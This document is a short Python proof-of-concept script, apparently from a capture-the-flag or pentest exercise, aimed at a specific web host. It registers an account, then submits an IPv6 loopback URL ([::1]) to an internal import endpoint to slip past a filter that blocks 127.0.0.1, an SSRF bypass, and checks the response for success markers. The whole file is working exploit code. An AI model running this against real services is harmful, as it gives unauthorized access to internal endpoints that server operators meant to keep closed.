import re,time,urllib.parse,requests
B="http://s1.nfx.my.id:49191"; U="lvp"+str(int(time.time()))[-6:]
s=requests.Session()
s.post(B+"/register",data={"username":U,"password":"pw"},allow_redirects=False)
u="http://[::1]:8081/internal/import?title=SSRF-PROOF&filter=benign"
r=s.post(B+"/submit",data={"url":u,"filter":"x"})
print("REQUEST:",r.request.method,r.request.url)
print("HTTP",r.status_code)
open("03-ssrf-submit-response.html","w").write(r.text)
for pat in ["Queued for moderation review","fetch failed","host is not allowed","unsupported scheme","invalid url","Ingested Gateway Response"]:
    if pat in r.text: print("MARKER:",pat)
# show the flash/err region
for m in re.finditer(r'<(?:p|div)[^>]*>([^<]{0,200})</(?:p|div)>', r.text):
    t=m.group(1).strip()
    if any(k in t for k in ("Queue","fetch","allowed","scheme","invalid","Ingest")):
        print("TEXT:",t[:200])
# also prove denial of literal localhost
r2=s.post(B+"/submit",data={"url":"http://127.0.0.1:8081/internal/import?filter=x","filter":"x"})
print("\nblocked literal:", "host is not allowed" in r2.text, "HTTP",r2.status_code)
